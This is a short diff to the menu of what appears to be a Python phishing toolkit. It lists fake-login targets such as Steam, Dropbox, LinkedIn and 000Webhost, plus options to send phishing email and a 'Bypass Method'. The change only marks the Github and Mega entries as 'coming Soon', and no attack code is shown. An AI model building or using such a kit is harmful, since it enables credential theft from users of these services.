@@ -49,7 +49,7 @@ def menu():
 	print(green + "[" + white + "8" + green + "]" + white + " Steam" + green + "			[" + white + "18" + green + "]" + white + " 000Webhost")
 	print(green + "[" + white + "9" + green + "]" + white + " Dropbox" + green + "			[" + white + "19" + green + "]" + white + " Dreamteam")
 	print(green + "[" + white + "10" + green + "]" + white + " Linkedin" + green + "			[" + white + "20" + green + "]" + white + " Gamehag")
-	print(green + "[" + white + "23" + green + "]" + white + " Github" + green + "			[" + white + "22" + green + "]" + white + " Mega")
+	print(green + "[" + white + "*" + green + "]" + white + " Github" + red + " coming Soon" + green + "	        [" + white + "*" + green + "]" + white + " Mega" + red + " coming Soon")
 	print(green + "-----------------------------------------------------------------------")
 	print(green + "[" + white + "30" + green + "]" + white + " Send Phishing Email")
 	print(green + "[" + white + "69" + green + "]" + white + " Bypass Method " + blue + " [1] " + alert + red + " {NEW}")
